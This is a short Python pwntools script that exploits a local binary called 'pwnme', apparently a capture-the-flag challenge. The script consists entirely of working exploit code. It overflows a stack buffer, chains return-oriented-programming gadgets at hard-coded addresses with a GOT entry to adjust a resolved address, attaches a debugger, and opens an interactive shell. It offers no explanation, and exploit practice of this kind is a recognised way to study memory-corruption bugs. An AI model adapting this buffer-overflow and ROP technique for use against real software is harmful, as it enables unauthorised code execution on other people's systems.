from pwn import *
context.log_level="debug"
sh=process("./pwnme")
elf=ELF("./pwnme")
gadget1=0x401191 # mov     rax, [rdi]
gadget2=0x4011B2 # sub     rax, rsi
rsir15=0x401189
jmp=0x000000000040109c
sp=0x0000000000401185
rdi=0x000000000040118b
main=0x401195
# payload=b'a'*0x10+b'b'*0x8
# payload+=p64(rdi)+p64(elf.got['pwnme'])+p64(gadget1)+p64(main)
# sh.sendlineafter(b"pwn me\n",payload)
payload=p64(rsir15)+p64(0x17)*2+p64(main)+p64(rdi)+p64(elf.got['pwnme'])+p64(gadget1)+p64(gadget2)+p64(jmp)
gdb.attach(sh)
sh.sendafter(b"pwn me\n",payload)
input()
payload=b'a'*0x10+b'b'*0x8+p64(rdi+1)*2+p64(rsir15)
sh.sendafter(b"pwn me\n", payload)
sh.interactive()